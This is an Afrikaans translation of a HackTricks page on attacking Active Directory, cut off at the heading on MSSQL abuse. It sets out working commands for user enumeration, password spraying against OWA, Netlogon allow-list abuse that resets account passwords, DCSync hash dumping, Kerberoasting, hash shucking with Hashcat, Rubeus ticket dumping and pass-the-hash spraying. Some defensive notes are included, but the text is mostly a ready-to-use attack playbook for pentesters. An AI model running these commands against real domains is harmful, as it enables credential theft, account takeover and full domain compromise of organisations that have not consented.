# Active Directory Methodologie

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as 'n fundamentele tegnologie wat **netwerkadministrateurs** in staat stel om **domeine**, **gebruikers** en **objekte** binne 'n netwerk doeltreffend te skep en te bestuur. Dit is ontwerp om te skaal, wat die organisering van 'n uitgebreide aantal gebruikers in hanteerbare **groepe** en **subgroepe** fasiliteer, terwyl **toegangsregte** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domeine**, **bome** en **woude**. 'n **Domein** omvat 'n versameling objekte, soos **gebruikers** of **toestelle**, wat 'n gemeenskaplike databasis deel. **Bome** is groepe van hierdie domeine wat deur 'n gedeelde struktuur verbind word, en 'n **woud** verteenwoordig die versameling van veelvuldige bome wat deur **trust relationships** onderling verbind is, en vorm die hoogste laag van die organisatoriese struktuur. Spesifieke **toegangs-** en **kommunikasieregte** kan op elk van hierdie vlakke toegeken word.

Belangrike konsepte binne **Active Directory** sluit in:

1. **Directory** – Bevat alle inligting rakende Active Directory-objekte.
2. **Object** – Dui entiteite binne die directory aan, insluitend **gebruikers**, **groepe** of **gedeelde vouers**.
3. **Domain** – Dien as 'n houer vir directory-objekte, met die vermoë dat veelvuldige domeine binne 'n **forest** kan bestaan, waar elkeen sy eie versameling objekte behou.
4. **Tree** – 'n Groepering van domeine wat 'n gemeenskaplike worteldomein deel.
5. **Forest** – Die toppunt van die organisatoriese struktuur in Active Directory, bestaande uit verskeie bome met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat 'n reeks dienste wat noodsaaklik is vir die gesentraliseerde bestuur en kommunikasie binne 'n netwerk. Hierdie dienste bestaan uit:

1. **Domain Services** – Sentreer data-berging en bestuur interaksies tussen **gebruikers** en **domeine**, insluitend **authentication**- en **search**-funksionaliteit.
2. **Certificate Services** – Hou toesig oor die skepping, verspreiding en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-geaktiveerde toepassings deur die **LDAP-protocol**.
4. **Directory Federation Services** – Bied **single-sign-on**-vermoëns om gebruikers oor verskeie webtoepassings in 'n enkele sessie te authenticate.
5. **Rights Management** – Help met die beskerming van materiaal waarop kopiereg berus deur die ongemagtigde verspreiding en gebruik daarvan te reguleer.
6. **DNS Service** – Noodsaaklik vir die oplossing van **domeinname**.

Vir 'n meer gedetailleerde verduideliking, kyk na: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om 'n **AD** aan te **val**, moet jy die **Kerberos authentication process** regtig goed **verstaan**.\
[**Lees hierdie bladsy as jy steeds nie weet hoe dit werk nie.**](kerberos-authentication.md)

## Cheat Sheet

Jy kan baie inligting by [https://wadcoms.github.io/](https://wadcoms.github.io) kry om vinnig te sien watter commands jy kan uitvoer om 'n AD te enumerate/exploit.

> [!WARNING]
> Kerberos-kommunikasie **vereis normaalweg 'n volledig gekwalifiseerde domeinnaam (FQDN)** sodat die client 'n ticket vir die korrekte SPN kan verkry. Toegang tot 'n masjien deur middel van 'n IP-adres val dikwels eerder terug na NTLM as Kerberos.

## Recon Active Directory (Geen creds/sessies)

As jy net toegang tot 'n AD-omgewing het, maar geen credentials/sessies het nie, kan jy:

- **Pentest die netwerk:**
- Scan die netwerk, vind masjiene en oop poorte, en probeer om **kwesbaarhede te exploit** of **credentials te extract** (byvoorbeeld, [drukkers kan baie interessante teikens wees](ad-information-in-printers.md)).
- DNS-enumeration kan inligting oor belangrike servers in die domein verskaf, soos web, drukkers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Kyk na die algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Check vir null- en Guest-toegang op smb-dienste** (dit sal nie op moderne Windows-weergawes werk nie):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 'n Meer gedetailleerde gids oor hoe om 'n SMB-server te enumerate, kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 'n Meer gedetailleerde gids oor hoe om LDAP te enumerate, kan hier gevind word (let **spesiale aandag op anonieme toegang**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison die netwerk**
- Versamel credentials deur [**services met Responder te impersonate**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Kry toegang tot 'n host deur [**die relay attack te abuse**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Versamel credentials deur [**fake UPnP services met evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) te **expose**
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extract usernames/name uit interne dokumente, sosiale media, dienste (hoofsaaklik web) binne die domeinomgewings en ook uit die publiek beskikbare bronne.
- As jy die volledige name van maatskappywerknemers vind, kan jy verskillende AD **username conventions (**[**lees hierdie**](https://activedirectorypro.com/active-directory-user-naming-convention/)) probeer. Die algemeenste konvensies is: _NameSurname_, _Name.Surname_, _NamSur_ (3letters van elk), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Kyk na die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html)- en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md)-bladsye.
- **Kerbrute enum**: Wanneer 'n **ongeldige username versoek word**, sal die server antwoord met die **Kerberos error**-kode _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons in staat stel om te bepaal dat die username ongeldig was. **Geldige usernames** sal óf die **TGT in 'n AS-REP**-antwoord óf die error _KRB5KDC_ERR_PREAUTH_REQUIRED_ lewer, wat aandui dat die gebruiker pre-authentication moet uitvoer.
- **No Authentication against MS-NRPC**: Gebruik auth-level = 1 (No authentication) teen die MS-NRPC (Netlogon)-interface op domain controllers. Die metode roep die `DsrGetDcNameEx2`-funksie aan nadat die MS-NRPC-interface gebind is, om te check of die gebruiker of rekenaar bestaan sonder enige credentials. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)-tool implementeer hierdie tipe enumeration. Die navorsing kan [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> gevind word.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access)-server**

As jy een van hierdie bedieners in die netwerk gevind het, kan jy ook **user enumeration teen dit uitvoer**. Jy kan byvoorbeeld die tool [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Jy kan lyste van gebruikersname in [**hierdie github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) vind.
>
> Jy behoort egter die **name van die mense wat by die maatskappy werk** te hê uit die recon-stap wat jy voorheen moes uitgevoer het. Met die naam en van kon jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om potensieel geldige usernames te genereer.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Selfs nadat **Zerologon** op die DC gepatch is, kan rekeninge wat uitdruklik toegelaat is steeds aan **legacy/vulnerable Netlogon secure-channel behavior** blootgestel word. Die riskante konfigurasie is die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** of die ooreenstemmende registry-waarde **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Daardie waarde is ’n **SDDL security descriptor** (sien [Security Descriptors](security-descriptors.md)). Enige rekening of groep wat die relevante ACE in die DACL toegestaan is, kan geteiken word. Byvoorbeeld, `O:BAG:BAD:(A;;RC;;;WD)` laat **Everyone** effektief toe.

Praktiese operator-werkvloei:

1. **Identifiseer principals wat toegelaat is** deur beide **SYSVOL/GPO** en die **live DC registry** na te gaan.
2. **Resolve SIDs** wat in die SDDL gevind word na werklike AD-gebruikers/rekenaars en prioritiseer **DC machine accounts**, **trust accounts** en ander bevoorregte masjiene.
3. Probeer herhaaldelik **MS-NRPC / Netlogon authentication** as die rekening wat toegelaat is.
4. Ná ’n suksesvolle raaiskoot, abuse **Netlogon password-setting** om die teikenrekening se wagwoord te reset (die publieke PoC stel dit op ’n leë string).<sup>[[9]](#references)[[10]](#references)</sup>

Vinnige triage-/lab-voorbeelde uit die publieke artefak:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notas:

- Die **scanner** is nuttig omdat die effektiewe allow-list in **SYSVOL**, die **registry**, of albei kan bestaan.
- Die exploit path self is belangrik omdat dit **geen Domain Admin-voorregte vereis nie** sodra ’n kwesbare rekening geïdentifiseer is.
- Om ’n **Domain Controller machine account** soos `DC$` te kompromitteer, is besonder gevaarlik omdat die terugstel van daardie wagwoord direk breër **AD takeover**-paaie kan moontlik maak.
- **Brute-force feasibility** hang van die modus af: die publieke artifact beskryf ’n meet-in-the-middle-benadering, ’n **24-bit** brute force wanneer ’n ander computer account beskikbaar is, en stadiger **32-bit**-variante.

Detection / hardening-notas:

- Oudit die allow-list-policy en verwyder alles behalwe tydelike, uitdruklik vereiste compatibility exceptions.
- Monitor DC **System**-events **5827/5828/5829/5830/5831** om kwesbare Netlogon-verbindings op te spoor wat geweier, ontdek, of uitdruklik deur die policy toegelaat word.
- Behandel rekeninge in `VulnerableChannelAllowList` as **hoërisiko** totdat die legacy dependency verwyder is.

### Om een of verskeie gebruikersname te ken

Goed, jy weet dus reeds dat jy ’n geldige gebruikersnaam het, maar geen wagwoorde nie... Probeer dan:

- [**ASREPRoast**](asreproast.md): As ’n gebruiker **nie** die attribute _DONT_REQ_PREAUTH_ het nie, kan jy ’n **AS_REP message aanvra** vir daardie gebruiker wat data sal bevat wat deur ’n afleiding van die gebruiker se wagwoord encrypted is.
- [**Password Spraying**](password-spraying.md): Kom ons probeer die mees **algemene wagwoorde** met elkeen van die ontdekte gebruikers; dalk gebruik een gebruiker ’n swak wagwoord (hou die password policy in gedagte!).
- Let daarop dat jy ook **OWA servers kan spray** om toegang tot die gebruikers se mail servers te probeer verkry.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy kan moontlik sommige challenge **hashes** **verkry** deur sekere protokolle van die **network** te **poison**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration verskaf kandidaat-rekeninge, hosts en services wat gedwing kan word om te authenticate. Gebruik daardie konteks om uitvoerbare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) en potensiële paaie na die AD-omgewing te identifiseer.

### NetExec workspace-driven recon & relay posture checks

- Gebruik **`nxcdb` workspaces** om AD recon-state per engagement te behou: `workspace create <name>` skep per-protokol SQLite DBs onder `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wissel views met `proto smb|mssql|winrm` en lys versamelde secrets met `creds`. Verwyder sensitiewe data handmatig wanneer jy klaar is: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Vinnige subnet discovery met **`netexec smb <cidr>`** wys **domain**, **OS build**, **SMB signing requirements** en **Null Auth**. Lede wat `(signing:False)` toon, is **relay-prone**, terwyl DCs dikwels signing vereis.
- Genereer **hostnames in /etc/hosts** direk uit NetExec-output om targeting te vergemaklik:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wanneer **SMB relay na die DC geblokkeer word** deur signing, toets steeds die **LDAP**-postuur: `netexec ldap <dc>` beklemtoon `(signing:None)` / swak channel binding. ’n DC met SMB signing vereis, maar LDAP signing gedeaktiveer, bly ’n lewensvatbare **relay-to-LDAP**-teiken vir misbruike soos **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer-/web-UIs **sluit soms gemaskerde admin-wagwoorde in HTML in**. Deur die bron/devtools te bekyk, kan cleartext (bv. `<input value="<password>">`) onthul word, wat Basic-auth-toegang bied om print repositories te skandeer.
- Onttrekte print jobs kan **plaintext onboarding-dokumente** met per-gebruiker-wagwoorde bevat. Hou die parings belyn wanneer jy toets:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

As jy **toegang tot ander rekenaars of shares** met die **null- of guest-user** kan verkry, kan jy **lêers plaas** (soos ’n SCF-lêer) wat, indien dit op een of ander manier verkry word, ’n **NTLM-authentication teen jou sal trigger** sodat jy die **NTLM challenge** kan **steel** om dit te crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandel elke NT-hash waaroor jy reeds beskik as ’n kandidaatwagwoord vir ander, stadiger formate waarvan die sleutelmaterial direk van die NT-hash afgelei word. In plaas daarvan om lang passphrases in Kerberos RC4-tickets, NetNTLM-challenges of cached credentials deur brute force te probeer kraak, voer jy die NT-hashes aan Hashcat se NT-candidate modes en laat jy dit password reuse valideer sonder om ooit die plaintext te leer. Dit is veral kragtig ná ’n domain compromise waar jy duisende huidige en historiese NT-hashes kan harvest.<sup>[[5]](#references)</sup>

Gebruik shucking wanneer:

- Jy ’n NT-corpus van DCSync, SAM/SECURITY-dumps of credential vaults het en vir reuse in ander domains/forests moet toets.
- Jy RC4-gebaseerde Kerberos-material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-responses of DCC/DCC2-blobs capture.
- Jy vinnig reuse vir lang, onkraakbare passphrases wil bewys en onmiddellik via Pass-the-Hash wil pivot.

Die tegniek **werk nie** teen encryption types waarvan die sleutels nie die NT-hash is nie (bv. Kerberos etype 17/18 AES). As ’n domain AES-only afdwing, moet jy na die gewone password modes terugkeer.

#### Building an NT hash corpus

- **DCSync/NTDS** – Gebruik `secretsdump.py` met history om die grootste moontlike stel NT-hashes (en hul vorige waardes) te bekom:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-inskrywings verbreed die kandidaatpool dramaties, omdat Microsoft tot 24 vorige hashes per account kan stoor. Vir meer maniere om NTDS-secrets te harvest, sien:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (of Mimikatz `lsadump::sam /patch`) ekstraheer plaaslike SAM/SECURITY-data en cached domain logons (DCC/DCC2). Deduplicate en voeg hierdie hashes by dieselfde `nt_candidates.txt`-lys.
- **Track metadata** – Hou die username/domain wat elke hash opgelewer het by (selfs al bevat die wordlist slegs hex). Matching hashes wys jou onmiddellik watter principal ’n password hergebruik sodra Hashcat die wenkandidaat druk.
- Verkies kandidate uit dieselfde forest of ’n trusted forest; dit maksimeer die kans op overlap tydens shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- NT-candidate-inputs **moet rou 32-hex NT-hashes bly**. Deaktiveer rule engines (geen `-r` en geen hybrid modes nie), omdat mangling die candidate key material korrupteer.
- Hierdie modes is nie inherent vinniger nie, maar die NTLM-keyspace (~30 000 MH/s op ’n M3 Max) is ~100× vinniger as Kerberos RC4 (~300 MH/s). Om ’n saamgestelde NT-lys te toets, is baie goedkoper as om die volledige password space in die stadiger formaat te ondersoek.
- Gebruik altyd die **nuutste Hashcat-build** (`git clone https://github.com/hashcat/hashcat && make install`), omdat modes 31500/31600/35300/35400 onlangs verskeep is.<sup>[[7]](#references)</sup>
- Daar is tans geen NT-mode vir AS-REQ Pre-Auth nie, en AES-etypes (19600/19700) vereis die plaintext password omdat hul sleutels via PBKDF2 van UTF-16LE-passwords afgelei word, nie van rou NT-hashes nie.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture ’n RC4 TGS vir ’n teiken-SPN met ’n low-privileged user (sien die Kerberoast-bladsy vir besonderhede):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck die ticket met jou NT-lys:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriveer die RC4-key van elke NT-kandidaat en valideer die `$krb5tgs$23$...`-blob. ’n Match bevestig dat die service account een van jou bestaande NT-hashes gebruik.

3. Pivot onmiddellik via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Jy kan die plaintext later opsioneel herwin met `hashcat -m 1000 <matched_hash> wordlists/` indien nodig.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons vanaf ’n compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopieer die DCC2-lyn vir die interessante domain user na `dcc2_highpriv.txt` en shuck dit:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. ’n Suksesvolle match lewer die NT-hash wat reeds in jou lys bekend is, en bewys dat die cached user ’n password hergebruik. Gebruik dit direk vir PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) of brute-force dit in fast NTLM mode om die string te herwin.

Presies dieselfde workflow is van toepassing op NetNTLM challenge-responses (`-m 27000/27100`) en DCC (`-m 31500`). Sodra ’n match geïdentifiseer is, kan jy relay, SMB/WMI/WinRM PtH launch, of die NT-hash vanlyn met masks/rules her-crack.



## Enumerating Active Directory MET credentials/session

Vir hierdie fase moet jy die **credentials of ’n session van ’n geldige domain account compromised het**. As jy geldige credentials of ’n shell as ’n domain user het, **moet jy onthou dat die opsies wat vroeër gegee is steeds opsies is om ander users te compromise**.

Voordat jy met authenticated enumeration begin, moet jy die **Kerberos double-hop problem** verstaan.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Om ’n account te compromise is ’n **belangrike stap om die domain te assesseer**, omdat dit authenticated **Active Directory enumeration** moontlik maak:

Met betrekking tot [**ASREPRoast**](asreproast.md) kan jy nou elke moontlike vulnerable user vind, en met betrekking tot [**Password Spraying**](password-spraying.md) kan jy ’n **lys van al die usernames** kry en die password van die compromised account, leë passwords en nuwe belowende passwords probeer.

- Jy kan die [**CMD gebruik om basiese recon uit te voer**](../basic-cmd-for-pentesters.md#domain-info)
- Jy kan ook [**powershell vir recon gebruik**](../basic-powershell-for-pentesters/index.html), wat meer stealthy sal wees
- Jy kan ook [**powerview gebruik**](../basic-powershell-for-pentesters/powerview.md) om meer gedetailleerde inligting te ekstraheer
- Nog ’n uitstekende tool vir recon in ’n active directory is [**BloodHound**](bloodhound.md). Dit is **nie baie stealthy nie** (afhangend van die collection methods wat jy gebruik), maar **as jy nie daaroor omgee nie**, behoort jy dit beslis te probeer. Vind waar users RDP kan gebruik, vind paths na ander groups, ens.
- **Ander geoutomatiseerde AD-enumeration tools is:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS-records van die AD**](ad-dns-records.md), aangesien dit interessante inligting kan bevat.
- ’n **Tool met ’n GUI** wat jy kan gebruik om die directory te enumerate, is **AdExplorer.exe** van die **SysInternal** Suite.
- Jy kan ook in die LDAP-database met **ldapsearch** soek vir credentials in die velde _userPassword_ en _unixUserPassword_, of selfs vir _Description_. Sien [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander methods.
- As jy **Linux** gebruik, kan jy ook die domain enumerate met [**pywerview**](https://github.com/the-useless-one/pywerview).
- Jy kan ook geoutomatiseerde tools probeer soos:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle domain users ekstraheer**

Dit is baie maklik om al die domain usernames vanaf Windows te verkry (`net user /domain`, `Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumeration-section klein, is dit die belangrikste deel van alles. Gaan na die links (hoofsaaklik dié van cmd, powershell, powerview en BloodHound), leer hoe om ’n domain te enumerate en oefen totdat jy gemaklik voel. Tydens ’n assessment sal dit die sleutelmoment wees om jou pad na DA te vind of te besluit dat niks gedoen kan word nie.

### Kerberoast

Kerberoasting behels die verkryging van **TGS-tickets** wat deur services gebruik word wat aan user accounts gekoppel is, en om hul encryption te crack—wat op user passwords gebaseer is—**offline**.

Meer hieroor:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, ens.)

Sodra jy sommige credentials verkry het, kan jy kontroleer of jy toegang tot enige **machine** het. Hiervoor kan jy **CrackMapExec** gebruik om met verskillende protocols op verskeie servers te probeer connect, volgens jou port scans.

### Local Privilege Escalation

As jy credentials of ’n session as ’n gewone domain user compromised het en toegang tot **enige machine in die domain** kan verkry, soek ’n path om **privileges plaaslik te escalate en credentials te collect**. Local administrator-privileges kan jou toelaat om **ander users se hashes** uit memory (LSASS) en plaaslike storage (SAM) te **dump**.

Daar is ’n volledige bladsy in hierdie boek oor [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) en ’n [**checklist**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Current Session Tickets

Dit is baie **onwaarskynlik** dat jy **tickets** in die huidige user sal vind wat jou **permission gee om** toegang tot onverwagte resources te verkry, maar jy kan kontroleer:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Met domein credentials of 'n gebruikersessie, herbesoek NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): geauthentiseerde enumerasie- en coercion-tegnieke kan relay-paaie blootlê wat tydens ongeauthentiseerde reconnaissance nie beskikbaar was nie.

### Soek na Creds in Computer Shares | SMB Shares

Noudat jy van die basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word, kan vind**. Jy kan dit handmatig doen, maar dit is 'n baie vervelige, repetitiewe taak (en selfs meer so as jy honderde dokumente vind wat jy moet nagaan).

[**Volg hierdie skakel om meer te leer oor tools wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

As jy **toegang tot ander rekenaars of shares** kan kry, kan jy **lêers plaas** (soos 'n SCF-lêer) wat, indien dit op een of ander manier verkry word, **'n NTLM-authentikasie teenoor jou sal trigger**, sodat jy die **NTLM challenge kan steel** om dit te crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geauthentiseerde gebruiker toegelaat om die **domain controller te compromise**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Vir die volgende tegnieke is 'n gewone domeingebruiker nie genoeg nie; jy het spesiale privileges/credentials nodig om hierdie attacks uit te voer.**

### Hash extraction

Hopelik het jy daarin geslaag om 'n **plaaslike admin**-rekening te **compromise** deur [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), insluitend relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [plaaslike privilege escalation](../windows-local-privilege-escalation/index.html) te gebruik.\
Dan is dit tyd om al die hashes in die geheue en plaaslik te dump.\
[**Lees hierdie bladsy oor verskillende maniere om die hashes te verkry.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van 'n gebruiker het**, kan jy dit gebruik om die gebruiker te **impersonate**.\
Jy moet 'n **tool** gebruik wat die **NTLM-authentikasie met** daardie **hash uitvoer**, **of** jy kan 'n nuwe **sessionlogon** skep en daardie **hash** binne die **LSASS** **inject**, sodat daardie **hash gebruik sal word wanneer enige NTLM-authentikasie uitgevoer word.** Die laaste opsie is wat mimikatz doen.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie attack is daarop gemik om **die gebruiker se NTLM-hash te gebruik om Kerberos-tickets aan te vra**, as 'n alternatief vir die algemene Pass The Hash oor die NTLM-protokol. Dit kan dus veral **nuttig wees in netwerke waar die NTLM-protokol gedeaktiveer is** en slegs **Kerberos as die authentikasieprotokol toegelaat word**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)**-aanvalmetode **steel attackers 'n gebruiker se authentikasie-ticket** in plaas van sy wagwoord of hash-waardes. Hierdie gesteelde ticket word dan gebruik om die gebruiker te **impersonate**, wat ongemagtigde toegang tot hulpbronne en dienste binne 'n netwerk verleen.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **wagwoord** van 'n **plaaslike administrator** het, moet jy probeer om daarmee **plaaslik by ander rekenaars aan te meld**.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let daarop dat dit taamlik **geraasvol** is en **LAPS** dit sou **versag**.

### MSSQL Abuse & Trusted Links

